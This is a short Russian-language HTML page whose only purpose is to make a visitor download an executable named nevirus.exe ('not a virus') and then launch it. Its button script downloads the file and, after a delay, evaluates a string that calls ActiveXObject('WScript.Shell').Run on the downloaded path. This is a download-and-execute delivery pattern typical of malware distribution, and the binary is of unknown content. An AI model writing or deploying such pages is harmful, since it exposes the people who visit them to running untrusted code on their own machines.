<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка и запуск файла</title>
</head>
<body>
    <h1>Загрузка и запуск файла nevirus.exe</h1>
    <p>Нажмите кнопку ниже, чтобы скачать и запустить файл nevirus.exe:</p>
    <button onclick="downloadAndRun()">Скачать и запустить</button>

    <script>
        function downloadAndRun() {
            const link = document.createElement('a');
            link.href = 'assets/nevirus.exe';
            link.download = 'nevirus.exe';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Запуск файла после загрузки
            setTimeout(() => {
                const runScript = `new ActiveXObject('WScript.Shell').Run('${window.location.href.replace(/[^\\/]*$/, '')}assets/nevirus.exe');`;
                new Function(runScript)();
            }, 1000); // Задержка в 1 секунду, чтобы файл успел загрузиться
        }
    </script>
</body>
</html>
